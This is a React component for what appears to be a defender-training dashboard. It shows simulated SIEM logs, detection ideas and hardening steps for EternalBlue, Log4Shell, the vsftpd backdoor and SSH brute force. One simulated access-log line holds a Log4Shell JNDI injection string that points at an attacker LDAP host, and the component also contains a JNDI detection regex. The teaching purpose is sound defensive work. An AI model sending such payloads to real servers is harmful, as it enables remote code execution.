import React, { useState } from 'react';
import { Shield, AlertCircle, Eye, FileText, Settings } from 'lucide-react';
import { vulnerabilities } from '../data/vulnerabilities';

interface LogEntry {
  timestamp: string;
  source: string;
  level: 'ALERT' | 'INFO' | 'WARNING';
  message: string;
}

export const DefenderMode: React.FC = () => {
  const [selectedScenario, setSelectedScenario] = useState('eternalblue');

  const getSimulatedLogs = (id: string): LogEntry[] => {
    const now = new Date();
    const timeStr = (offsetSecs: number) => {
      const d = new Date(now.getTime() - offsetSecs * 1000);
      return d.toISOString().replace('T', ' ').substring(0, 19);
    };

    switch (id) {
      case 'eternalblue':
        return [
          {
            timestamp: timeStr(15),
            source: 'Firewall-ASA',
            level: 'INFO',
            message: 'Connection permitted: TCP 192.168.1.10:48214 -> 192.168.1.50:445 (SMB)'
          },
          {
            timestamp: timeStr(12),
            source: 'Snort-IDS',
            level: 'ALERT',
            message: '[1:23912:2] OS-WINDOWS Microsoft Windows SMB remote code execution attempt (MS17-010)'
          },
          {
            timestamp: timeStr(10),
            source: 'Windows-EventLog',
            level: 'WARNING',
            message: 'Event ID 7045 (System): A service was installed in the system. Service Name: ms17_010_service, Service Type: user-mode service'
          },
          {
            timestamp: timeStr(8),
            source: 'EDR-CrowdStrike',
            level: 'ALERT',
            message: 'Suspicious process spawning: lsass.exe spawned child process cmd.exe (Parent PID: 620, Child PID: 4528)'
          },
          {
            timestamp: timeStr(5),
            source: 'Firewall-ASA',
            level: 'WARNING',
            message: 'Outbound connection detected on unusual port: TCP 192.168.1.50:50114 -> 192.168.1.10:4444'
          }
        ];

      case 'log4shell':
        return [
          {
            timestamp: timeStr(20),
            source: 'Apache-AccessLog',
            level: 'INFO',
            message: '192.168.1.10 - - [16/Jul/2026:13:52:10 +0000] "GET /login HTTP/1.1" 200 4821 "-" "${jndi:ldap://192.168.1.10:1389/a}"'
          },
          {
            timestamp: timeStr(18),
            source: 'Suricata-IDS',
            level: 'ALERT',
            message: 'ET EXPLOIT Apache Log4j RCE Attempt (CVE-2021-44228) JNDI Lookup patterns detected'
          },
          {
            timestamp: timeStr(15),
            source: 'Syslog-WebProd',
            level: 'WARNING',
            message: 'java[4912]: JNDI lookup triggered: ldap://192.168.1.10:1389/a'
          },
          {
            timestamp: timeStr(10),
            source: 'Firewall-ASA',
            level: 'ALERT',
            message: 'Outbound LDAP traffic blocked: TCP 192.168.1.80:49215 -> 192.168.1.10:1389 (Rule: Deny-Egress-LDAP)'
          }
        ];

      case 'vsftpd_backdoor':
        return [
          {
            timestamp: timeStr(15),
            source: 'syslog-ftp',
            level: 'INFO',
            message: 'vsftpd[891]: FTP connection from 192.168.1.10'
          },
          {
            timestamp: timeStr(12),
            source: 'syslog-ftp',
            level: 'INFO',
            message: 'vsftpd[891]: USER root:) attempted login. Password required.'
          },
          {
            timestamp: timeStr(10),
            source: 'Snort-IDS',
            level: 'ALERT',
            message: '[1:19283:1] EXPLOIT vsftpd 2.3.4 Backdoor activation signature detected'
          },
          {
            timestamp: timeStr(8),
            source: 'Netstat-Monitor',
            level: 'WARNING',
            message: 'Unusual listener port activated: TCP 0.0.0.0:6200 status LISTENING (Associated with PID: 891)'
          },
          {
            timestamp: timeStr(5),
            source: 'Firewall-ASA',
            level: 'ALERT',
            message: 'Connection established to backdoor port: TCP 192.168.1.10:48293 -> 192.168.1.110:6200'
          }
        ];

      case 'ssh_bruteforce':
        return [
          {
            timestamp: timeStr(30),
            source: 'syslog-ssh',
            level: 'INFO',
            message: 'sshd[1248]: Failed password for invalid user admin from 192.168.1.10 port 49102 ssh2'
          },
          {
            timestamp: timeStr(25),
            source: 'syslog-ssh',
            level: 'INFO',
            message: 'sshd[1250]: Failed password for root from 192.168.1.10 port 49104 ssh2'
          },
          {
            timestamp: timeStr(20),
            source: 'syslog-ssh',
            level: 'INFO',
            message: 'sshd[1252]: Failed password for user database from 192.168.1.10 port 49106 ssh2'
          },
          {
            timestamp: timeStr(15),
            source: 'Fail2Ban',
            level: 'WARNING',
            message: 'Authentication failures threshold reached for 192.168.1.10. Triggering block sequence.'
          },
          {
            timestamp: timeStr(10),
            source: 'syslog-ssh',
            level: 'ALERT',
            message: 'sshd[1260]: Accepted password for admin from 192.168.1.10 port 49120 ssh2'
          }
        ];

      default:
        return [];
    }
  };

  const getDetectionsAndPrevention = (id: string) => {
    switch (id) {
      case 'eternalblue':
        return {
          detection: [
            'Signature-based network IDS rules looking for transit SMBv1 NT Trans2 requests containing malicious buffers.',
            'Endpoint detection looking for lsass.exe spawning CMD.exe or PowerShell process.',
            'Security audit logs identifying Event ID 7045 (New Service created) with randomized or generic naming formats.'
          ],
          prevention: [
            'Upgrade systems to disable legacy SMBv1 protocol entirely.',
            'Apply Microsoft Security Bulletin MS17-010 (KB4013389).',
            'Segment networks to isolate system management ports (445, 139) from generic workstation zones.'
          ]
        };
      case 'log4shell':
        return {
          detection: [
            'Inspection of HTTP headers (User-Agent, Content-Type, Authorization, URI) for string pattern matches on \\$\\{jndi:(ldap|rmi|dns|ldaps|http)://.',
            'Egress firewall logging showing servers initiating LDAP query traffic (port 1389/389) out to external internet spaces.',
            'EDR process audits indicating java runtime spawning child execution scripts.'
          ],
          prevention: [
            'Upgrade the log4j2 library components to version 2.17.1+.',
            'Block outbound internet query routing from internal server subnets (mandate egress firewalls).',
            'Disable log4j formats lookup by setting system configuration flag log4j2.formatMsgNoLookups=true.'
          ]
        };
      case 'vsftpd_backdoor':
        return {
          detection: [
            'IDS alerts matching connection triggers (user input containing :) signature).',
            'Scanning for host listener binds on uncharacteristic port 6200.',
            'Firewall alerts indicating connections established on unexpected ports from internal servers.'
          ],
          prevention: [
            'Run package checksum audits (rpm -Va or debsums) to detect binaries modified without authorization.',
            'Replace vulnerable vsftpd v2.3.4 archive with verified package dependencies.',
            'Restrict incoming access permissions to essential ports (block Port 6200).'
          ]
        };
      default:
        return {
          detection: [
            'Fail2Ban logging tracking repeated authentication failure logs from the same source IP.',
            'Audit check for SSH logins occurring at irregular hours or from unusual locations.',
            'SIEM correlation of multiple connection flows across short time durations targeting credentials.'
          ],
          prevention: [
            'Enforce key-based SSH certificate authentications and disable standard password credentials.',
            'Mandate Multi-Factor Authentication (MFA) validation for shell logins.',
            'Configure SSH daemon to disable root logins directly (PermitRootLogin no).'
          ]
        };
    }
  };

  const logs = getSimulatedLogs(selectedScenario);
  const info = getDetectionsAndPrevention(selectedScenario);


  return (
    <div className="space-y-6">
      <div className="glass-panel rounded-xl p-6 border-slate-800 flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
        <div>
          <h3 className="text-lg font-mono text-emerald-400 font-bold uppercase flex items-center gap-2">
            <Shield className="h-5 w-5" /> DEFENDER PERSPECTIVE MODE
          </h3>
          <p className="text-xs text-slate-500 font-mono mt-1">
            Learn what logs, SIEM dashboards, and network filters look like when a Metasploit exploit is executed.
          </p>
        </div>

        {/* Attack Scenario Selection */}
        <div className="flex items-center gap-3">
          <label className="text-xs font-mono text-slate-400">Attack Event:</label>
          <select
            value={selectedScenario}
            onChange={(e) => setSelectedScenario(e.target.value)}
            className="bg-slate-900 border border-slate-800 text-xs font-mono text-slate-200 px-3 py-1.5 rounded-lg focus:outline-none focus:border-emerald-500"
          >
            {vulnerabilities.map(v => (
              <option key={v.id} value={v.id}>{v.name.split(' (')[0]}</option>
            ))}
          </select>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Simulated SIEM log outputs */}
        <div className="flex flex-col">
          <div className="bg-slate-900 border border-slate-800 rounded-t-xl px-4 py-2 flex items-center gap-2 select-none">
            <FileText className="h-4 w-4 text-emerald-400" />
            <span className="text-xs font-mono text-slate-300 font-bold">SIEM Log Stream (Correlation Engine)</span>
          </div>
          <div className="bg-slate-950 border-x border-b border-slate-800 rounded-b-xl p-4 h-[380px] overflow-y-auto font-mono text-[10px] space-y-3 shadow-inner">
            {logs.map((log, idx) => (
              <div key={idx} className="border-b border-slate-900 pb-2 last:border-b-0">
                <div className="flex justify-between items-center text-slate-500 mb-1">
                  <span>{log.timestamp}</span>
                  <span className={`px-1.5 py-0.5 rounded text-[8px] font-bold ${
                    log.level === 'ALERT' 
                      ? 'bg-rose-500/10 text-rose-400 border border-rose-500/20' 
                      : log.level === 'WARNING'
                        ? 'bg-amber-500/10 text-amber-400 border border-amber-500/20'
                        : 'bg-blue-500/10 text-blue-400 border border-blue-500/20'
                  }`}>
                    {log.level}
                  </span>
                </div>
                <div className="text-slate-400">
                  <span className="text-emerald-500 font-bold">[{log.source}]</span> {log.message}
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Defense opportunities and remediation details */}
        <div className="glass-panel rounded-xl p-6 border-slate-800 flex flex-col justify-between h-[415px] overflow-y-auto">
          <div className="space-y-4">
            <div className="border-b border-slate-800 pb-2">
              <h4 className="text-xs font-mono text-emerald-400 font-bold uppercase flex items-center gap-1.5">
                <Eye className="h-4 w-4" /> Detection Opportunities
              </h4>
              <p className="text-[10px] text-slate-500 font-mono mt-0.5">
                Security analysts use these parameters to flag and track active exploit patterns.
              </p>
            </div>
            
            <ul className="space-y-2">
              {info.detection.map((det, i) => (
                <li key={i} className="flex gap-2 items-start text-xs font-mono text-slate-300">
                  <AlertCircle className="h-4 w-4 text-emerald-500 shrink-0 mt-0.5" />
                  <span className="leading-relaxed">{det}</span>
                </li>
              ))}
            </ul>

            <div className="border-b border-slate-800 pb-2 pt-2">
              <h4 className="text-xs font-mono text-emerald-400 font-bold uppercase flex items-center gap-1.5">
                <Settings className="h-4 w-4" /> Hardening & Prevention
              </h4>
              <p className="text-[10px] text-slate-500 font-mono mt-0.5">
                Apply these changes to close the vulnerability and secure the target hosts.
              </p>
            </div>

            <ul className="space-y-2">
              {info.prevention.map((prev, i) => (
                <li key={i} className="flex gap-2 items-start text-xs font-mono text-slate-300">
                  <div className="h-2 w-2 rounded-full bg-cyan-400 shrink-0 mt-1.5"></div>
                  <span className="leading-relaxed">{prev}</span>
                </li>
              ))}
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
};
